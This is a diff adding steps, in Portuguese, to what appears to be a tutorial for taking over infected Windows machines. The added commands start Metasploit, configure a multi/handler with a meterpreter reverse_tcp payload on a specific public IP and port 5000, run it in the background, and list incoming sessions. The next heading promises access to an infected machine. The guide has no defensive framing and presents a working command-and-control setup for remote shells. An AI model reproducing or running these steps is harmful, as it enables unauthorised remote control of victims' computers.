@@ -101,7 +101,23 @@ PASSOS
 
         Agora voltamos para a nossa instancia para iniciarmos a esculta do backdoor na nossa porta
         
+            em acesso SSH a nossa instancia iniciamos o console do Metasploit executado
+            
+            $ msfconsole
+        
+                depois de iniciado
+                
+                msf > use exploit/multi/handler   
+                 msf >set PAYLOAD windows/meterpreter/reverse_tcp    
+                 msf >set LHOST 34.97.212.80  
+                 msf >set LPORT 5000   
+                 msf >set ExitOnSession false   
+                 msf > exploit -j -z   
+                 
+              em seguida 
+              
+                msf> sessions -l 
+                
+                para listar nossas conexões de entrada até o momento
     
-
-
 8 - Obter acesso a uma maquina infectada
